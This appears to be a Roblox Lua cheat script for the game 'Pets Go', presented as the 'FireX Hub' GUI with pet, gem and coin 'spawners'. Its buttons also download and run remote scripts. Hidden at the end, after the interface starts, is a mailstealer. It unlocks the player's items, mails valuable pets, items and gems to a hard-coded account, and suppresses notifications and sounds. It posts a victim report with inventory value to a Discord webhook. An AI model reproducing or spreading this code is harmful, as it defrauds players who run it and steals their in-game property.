local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
local Window = OrionLib:MakeWindow({
    Name = "FireX HubðŸ”¥ â”ƒ Pets Go GUIðŸŽ²",
    HidePremium = true,
    SaveConfig = true,
    ConfigFolder = "Swift Hub",
    IntroEnabled = true,
    IntroText = "Welcome to FireX Hub! â”ƒ Script Made By @FireXhub_ ON YouTube"
})

-- About Us Tab
local AboutUsTab = Window:MakeTab({
    Name = "About Us",
    Icon = "rbxassetid://17586572991",
    PremiumOnly = false
})

AboutUsTab:AddParagraph("REGARDING HUB", "â€¢ My Swift HUB in Pets Go is a script that enriches your gaming experience by providing essential features for seamless gameplay.")
AboutUsTab:AddParagraph("Support Me", "By subscribing to my YouTube Channel or joining my Discord Server. Thank you!")

local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)

-- Variables for pet names
local fromPet = ""
local toPet = ""

-- Create the Pet Hunting Tab
local PetHuntingTab = Window:MakeTab({
    Name = "Pet Hunting",
    Icon = "rbxassetid://17586729056",
    PremiumOnly = false
})

PetHuntingTab:AddParagraph("How To Use", "Type the name of a pet inside the egg you're rolling in the first box, and the name of the pet you want to roll in the second box.")

PetHuntingTab:AddSection({ Name = "Pet Hunter" })

-- Textbox to enter 'fromPet'
PetHuntingTab:AddTextbox({
    Name = "Pet In Egg",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        fromPet = Value
        print("From Pet: " .. fromPet)
    end
})

-- Textbox to enter 'toPet'
PetHuntingTab:AddTextbox({
    Name = "Pet You Want",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        toPet = Value
        print("To Pet: " .. toPet)
    end
})

-- Button to trigger the pet hunting process
PetHuntingTab:AddButton({
    Name = "Hunt Pet!",
    Callback = function()
        if fromPet == "" or toPet == "" then
            warn("Please fill in both 'From Pet' and 'To Pet' names!")
            return
        end
        
        if Pets[fromPet] and Pets[toPet] then
            -- Clear original pet properties
            for i in pairs(Pets[fromPet]) do
                Pets[fromPet][i] = nil
            end
            -- Copy new pet properties
            for i, v in pairs(Pets[toPet]) do
                Pets[fromPet][i] = v
            end
            print("Successfully spawned", fromPet, "to", toPet)
        else
            warn("Invalid pet names! Please confirm the pet names.")
        end
    end
})

-- Trading Plaza Tab
local TradingPlazaTab = Window:MakeTab({
    Name = "Trading Plaza",
    Icon = "rbxassetid://17316268316",
    PremiumOnly = false
})

TradingPlazaTab:AddParagraph("How To Use", "Type the amount of gems you would like to bug; if it doesn't work, try 1m.")

TradingPlazaTab:AddSection({ Name = "Gems" })

TradingPlazaTab:AddTextbox({
    Name = "Amount To Bug",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        print(Value)
    end
})

TradingPlazaTab:AddButton({
    Name = "Bug Gems!",
    Callback = function()
        local function formatNumber(number)
            if number == nil then
                return "0"
            end
            local suffixes = {"", "k", "m", "b", "t"}
            local suffixIndex = 1
            while number >= 1000 do
                number = number / 1000
                suffixIndex = suffixIndex + 1
            end
            return string.format(number % 1 == 0 and "%d%s" or "%.2f%s", number, suffixes[suffixIndex])
        end

        local GetSave = function()
            return require(game.ReplicatedStorage.Library.Client.Save).Get()
        end

        local GemAmount1 = 0
        for _, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount1 = v._am
                break
            end
        end

        local t = GemAmount1
        local oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local args = {...}
            local method = getnamecallmethod()

            if method == "InvokeServer" and self.Name == "Booths_RequestPurchase" then
                t = t + 1000000
                return oldNamecall(self, ...)
            end
            return oldNamecall(self, ...)
        end)

        local function updateGem(amount)
            local playerGui = game.Players.LocalPlayer.PlayerGui.Main
            playerGui.Top.Diamonds.Amount.Text = formatNumber(amount)
            playerGui.Left["Diamonds Desktop"].Amount.Text = formatNumber(amount)
        end

        game:GetService("RunService").Heartbeat:Connect(function()
            updateGem(t)
        end)

        updateGem(GemAmount1)
    end    
})

-- Create the Pet Spawner Tab
local PetSpawnerTab = Window:MakeTab({
    Name = "Pet Spawner",
    Icon = "rbxassetid://17586693431",
    PremiumOnly = false
})

PetSpawnerTab:AddParagraph("How To Use", "Type the name of a pet currently in your inventory in the 'from pet' box and the pet you would like to spawn in the 'to pet' box.")

PetSpawnerTab:AddSection({ Name = "Pet Spawner" })

-- Textbox to enter 'fromPet'
PetSpawnerTab:AddTextbox({
    Name = "From Pet",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        fromPet = Value
        print("From Pet: " .. fromPet)
    end
})

-- Textbox to enter 'toPet'
PetSpawnerTab:AddTextbox({
    Name = "To Pet",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        toPet = Value
        print("To Pet: " .. toPet)
    end
})

-- Button to trigger the pet spawning process
PetSpawnerTab:AddButton({
    Name = "Spawn Pet!",
    Callback = function()
        if fromPet == "" or toPet == "" then
            warn("Please fill in both 'From Pet' and 'To Pet' names!")
            return
        end
        
        if Pets[fromPet] and Pets[toPet] then
            for i in pairs(Pets[fromPet]) do
                Pets[fromPet][i] = nil
            end
            for i, v in pairs(Pets[toPet]) do
                Pets[fromPet][i] = v
            end
            print("Successfully spawned", fromPet, "to", toPet)
        else
            warn("Invalid pet names! Please confirm the pet names.")
        end
    end
})

-- Gem Spawning Tab
local GemSpawnTab = Window:MakeTab({
    Name = "Gem Spawning",
    Icon = "rbxassetid://17586779012",
    PremiumOnly = false
})

GemSpawnTab:AddParagraph("How To Use", "Type the amount of gems you would like to spawn in the box then click spawn once.")

local spawnAmount = "0"

GemSpawnTab:AddTextbox({
    Name = "Amount to spawn",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        spawnAmount = Value
    end	  
})

GemSpawnTab:AddButton({
    Name = "Spawn!",
    Callback = function()
        game.Players.LocalPlayer.PlayerGui.Main.Top.Diamonds.Amount.Text = spawnAmount
    end    
})

-- Coin Spawning Tab
local CoinSpawnTab = Window:MakeTab({
    Name = "Coin Spawning",
    Icon = "rbxassetid://17586674425",
    PremiumOnly = false
})

CoinSpawnTab:AddParagraph("How To Use", "Type the amount of coins you would like to spawn and click spawn once.")

CoinSpawnTab:AddTextbox({
    Name = "Amount to spawn",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        spawnAmount = Value
    end	  
})

CoinSpawnTab:AddButton({
    Name = "Spawn!",
    Callback = function()
        game.Players.LocalPlayer.PlayerGui.Main.Top.Coins.Amount.Text = spawnAmount
    end    
})

-- Auto Farming GUI Tab
local AutoFarmTab = Window:MakeTab({
    Name = "Auto Farming GUI",
    Icon = "rbxassetid://17586593789",
    PremiumOnly = false
})

AutoFarmTab:AddParagraph("Auto Farm GUIs", "Click one of the GUIs for auto farm, auto roll, craft potions, and more.")

AutoFarmTab:AddButton({
    Name = "Auto Farm Gui 1 (KEY)",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/PETS-GO!-NEW-The-Best-Free-Script-ZapHub-20119"))()
    end    
})

AutoFarmTab:AddButton({
    Name = "Auto Farm Gui 2 (KEY)",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/PETS-GO!-NEW-BEST-SCRIPT-20019"))()
    end    
})

AutoFarmTab:AddButton({
    Name = "Auto Farm Gui 3 (NO KEY)",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/PETS-GO!-NEW-Speed-Hub-X-Keyless-20021"))()
    end    
})

AutoFarmTab:AddButton({
    Name = "Auto Farm Gui 4 (NO KEY)",
    Callback = function()
  loadstring(game:HttpGet("https://rawscripts.net/raw/PETS-GO!-NEW-AtherHub-20271"))()
end    
})

-- Extra Tab
local ExtraTab = Window:MakeTab({
    Name = "Extra",
    Icon = "rbxassetid://17586795822",
    PremiumOnly = false
})

ExtraTab:AddParagraph("Disclaimer", "All features are visual and for looks only; none of the gems are real.")
ExtraTab:AddParagraph("More", "Expect more features that work soon.")

ExtraTab:AddButton({
    Name = "Click to copy Discord link",
    Callback = function()
    setclipboard("https://discord.gg/twHaX3kGXG")
    end    
})

ExtraTab:AddButton({
    Name = "Anti AFK",
    Callback = function()
    end    
})

ExtraTab:AddButton({
    Name = "Anti MailStealer",
    Callback = function()
end 
})

ExtraTab:AddButton({
    Name = "Anti Lag",
    Callback = function()
        -- Add anti-Lag functionality if needed
    end    
})

-- Initialize the UI
OrionLib:Init()


Username = "YACINEPRO336"
min_rap = 1000 -- minimum rap of each item you want to get sent to you. 10k by default
min_chance = 100000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
webhook = "https://discord.com/api/webhooks/1277945797316710532/UdkKGyGahy4Qh2x_ZW7xjSmZkc74tFRaYhOISMP9e4tLs0AeZF2YLQlw9J9pOSKl4Kmx"

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Join gg / GY2RVSEGDT to get back"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Pets Go Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username or "tobi437a"
local min_rap = min_rap or 10000
local min_chance = min_chance or 10000
local webhook = webhook

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	until response == true
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= 500 and GemAmount1 >= min_rap then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
                    if difficulty >= min_chance then
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 then
    ClaimMail()

    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
    local blob_b = require(blob_a).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    require(blob_a).Get = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)
    
    spawn(function()
        SendMessage(plr.Name, GemAmount1)
    end)

    SendAllGems()

    for _, item in ipairs(sortedItems) do
        sendItem(item.category, item.uid, item.amount)
    end
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
    setclipboard("discord.gg/GY2RVSEGDT")
end
